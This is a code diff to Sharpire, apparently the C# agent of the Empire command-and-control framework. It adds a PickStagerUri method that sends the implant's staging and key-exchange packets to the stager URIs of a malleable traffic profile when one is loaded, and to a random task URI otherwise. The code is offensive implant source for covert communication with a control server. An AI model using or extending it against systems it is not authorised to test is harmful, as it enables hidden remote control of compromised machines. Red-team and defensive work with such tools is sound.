@@ -340,8 +340,7 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
 
-            Random random = new Random();
-            byte[] response = SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            byte[] response = SendData(PickStagerUri(), routingPacket);
 
             RoutingPacket packet = DecodeRoutingPacket(response);
             sessionInfo.SetAgentId(packet.SessionId);
@@ -473,8 +472,34 @@ namespace Sharpire
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentId(), 3, encryptedData);
 
-            Random random = new Random();
-            SendData(sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)], routingPacket);
+            SendData(PickStagerUri(), routingPacket);
+        }
+
+        // Pick the URI to POST stage1 / stage2 routing packets to. When a
+        // malleable profile is present, the server routes stager POSTs via
+        // profile.stager.client.uris — hitting a task URI (GetTaskUrIs) would
+        // land on profile.post instead and crash the server's extract path.
+        // Falls back to the legacy random-task-URI behavior when no malleable
+        // profile is loaded (plain http listener).
+        private string PickStagerUri()
+        {
+            MalleableProfile mp = sessionInfo.GetMalleableProfile();
+            if (mp != null && mp.Sections != null)
+            {
+                Section stager;
+                if (mp.Sections.TryGetValue("stager", out stager)
+                    && stager != null
+                    && stager.Client != null
+                    && stager.Client.Uris != null
+                    && stager.Client.Uris.Length > 0)
+                {
+                    Random r = new Random();
+                    return stager.Client.Uris[r.Next(0, stager.Client.Uris.Length)];
+                }
+            }
+            string[] taskUris = sessionInfo.GetTaskUrIs();
+            Random rand = new Random();
+            return taskUris[rand.Next(0, taskUris.Length)];
         }
 
         private void DotNetEmpire()
